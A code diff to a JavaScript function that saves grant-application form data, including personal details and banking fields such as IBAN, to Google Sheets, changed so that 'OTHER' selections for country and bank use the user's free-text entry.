@@ -31,7 +31,9 @@ async function saveToGoogleSheets(txNumber) {
             action:            'save_data',
             transaction_id:    txNumber,
             full_name:         formData.personalInfo.fullName         || '',
-            country:           formData.personalInfo.country          || '',
+            country: formData.personalInfo.country === 'OTHER'
+         ? (formData.personalInfo.otherCountry || '')
+         : (formData.personalInfo.country || ''),
             marital_status:    formData.personalInfo.maritalStatus    || '',
             num_children:      formData.personalInfo.numChildren      || 0,
             phone:             formData.contactCareer.phone           || '',
@@ -41,7 +43,9 @@ async function saveToGoogleSheets(txNumber) {
             grant_type:        formData.grantDetails.grantType        || '',
             grant_amount:      formData.grantDetails.grantAmount      || 0,
             grant_description: formData.grantDetails.grantDescription || '',
-            bank_name:         formData.bankingInfo.bankName          || '',
+            bank_name: formData.bankingInfo.bankName === 'OTHER'
+           ? (formData.bankingInfo.otherBank || '')
+           : (formData.bankingInfo.bankName || ''),
             account_holder:    formData.bankingInfo.accountHolder     || '',
             iban:              (formData.bankingInfo.iban || '').replace(/\s/g, '')
         });
